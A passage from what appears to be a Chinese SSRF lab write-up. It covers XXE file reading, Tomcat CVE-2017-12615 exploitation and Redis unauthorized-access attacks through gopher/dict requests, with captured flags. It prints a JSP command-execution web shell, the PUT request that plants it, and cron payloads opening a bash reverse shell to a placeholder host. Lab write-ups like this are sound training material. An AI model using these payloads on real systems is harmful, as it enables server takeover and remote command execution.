+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;POST / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host: 172.72.23.25
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept-Encoding: gzip, deflate, br
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Length: 172
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Origin: http://172.72.23.25
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Referer: http://172.72.23.25/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Upgrade-Insecure-Requests: 1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Priority: u=0, i
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding= &amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE user [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34; &amp;gt;]&amp;gt;&amp;lt;user&amp;gt; &amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt; &amp;lt;password&amp;gt;admin&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;数据包二次编码后使用gopher协议传入，最后取得flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_25}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006013724422.png"
+width="1146"
+height="685"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006013724422_hu_2345f29b6dcd7078.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006013724422_hu_7e4ae99a5d4a38b1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="167"
+data-flex-basis="401px"
+&gt;&lt;/p&gt;
+&lt;h2 id="cve-2017-12615"&gt;CVE-2017-12615
+&lt;/h2&gt;&lt;h3 id="tomcat-应用详情"&gt;Tomcat 应用详情
+&lt;/h3&gt;&lt;p&gt;本场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞。&lt;/p&gt;
+&lt;h3 id="cve-2017-12615复现"&gt;CVE-2017-12615复现
+&lt;/h3&gt;&lt;p&gt;JSP一句话&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String command = request.getParameter(&amp;#34;cmd&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if(command != null)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; int a = -1;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] b = new byte[2048];
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; while((a=in.read(b))!=-1)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.println(new String(b));
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; } else {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;format: xxx.jsp?cmd=Command&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;数据包&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PUT /shell.jsp/ HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host: 172.72.23.26:8080
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept: */*
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Accept-Language: en
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Connection: close
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Content-Length: 460
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String command = request.getParameter(&amp;#34;cmd&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if(command != null)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; int a = -1;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] b = new byte[2048];
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; while((a=in.read(b))!=-1)
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.println(new String(b));
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; } else {
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; out.print(&amp;#34;format: xxx.jsp?cmd=Command&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将个 PUT 请求二次 URL 编码，最后通过 SSRF 发起这个 POST 请求，返回 201 状态码表示成功写 shell&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003011934592.png"
+width="1195"
+height="648"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003011934592_hu_c12238d491a29ef3.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003011934592_hu_c3c3b49d76a2242b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="184"
+data-flex-basis="442px"
+&gt;&lt;/p&gt;
+&lt;p&gt;接着通过 SSRF 发起对 shell.jsp 的 HTTP 请求，成功执行了 &lt;code&gt;cat /flag&lt;/code&gt; 的命令&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003012254852.png"
+width="1072"
+height="690"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003012254852_hu_ea3fe337b6ab257e.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251003012254852_hu_9394054ca8b055f4.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="155"
+data-flex-basis="372px"
+&gt;&lt;/p&gt;
+&lt;p&gt;最终取得flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_26}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="redis-未授权"&gt;Redis 未授权
+&lt;/h2&gt;&lt;h3 id="redis-unauth-应用详情"&gt;Redis unauth 应用详情
+&lt;/h3&gt;&lt;p&gt;未授权的 Redis 服务常规的攻击思路的主要命令如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 清空 key&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;flushall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 设置要操作的路径为定时任务目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;dir&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;spool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 设置定时任务角色为 root&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;dbfilename&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 设置定时任务内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;* * * * * /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 保存操作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;save&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="ssrf-之-redis-unauth"&gt;SSRF 之 Redis unauth
+&lt;/h3&gt;&lt;p&gt;SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击操作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个奇技淫巧就是攻击未授权的 Redis 服务，格式如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;dict://x.x.x.x:6379/&amp;lt;Redis 命令&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005161442833.png"
+width="819"
+height="924"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005161442833_hu_982c44625c488f4b.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005161442833_hu_f314fa8bdca3b6b7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="88"
+data-flex-basis="212px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 清空 key&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flushall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 设置要操作的路径为定时任务目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;dir&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;spool&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cron&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 在定时任务目录下创建 root 的定时任务文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;dbfilename&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 写入 Bash 反弹 shell 的 payload&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;* * * * * /bin/bash -i &amp;gt;%26 /dev/tcp/x.x.x.x/2333 0&amp;gt;%261&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 保存上述操作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在目标系统上创建定时任务后，shell 也弹了出来，查看下 &lt;code&gt;cat /etc/hosts&lt;/code&gt; 的确是 172.72.23.27 这台内网机器：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162357668.png"
+width="550"
+height="275"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162357668_hu_7d5a5d1182f72874.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162357668_hu_a4048371ee361e99.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="200"
+data-flex-basis="480px"
+&gt;&lt;/p&gt;
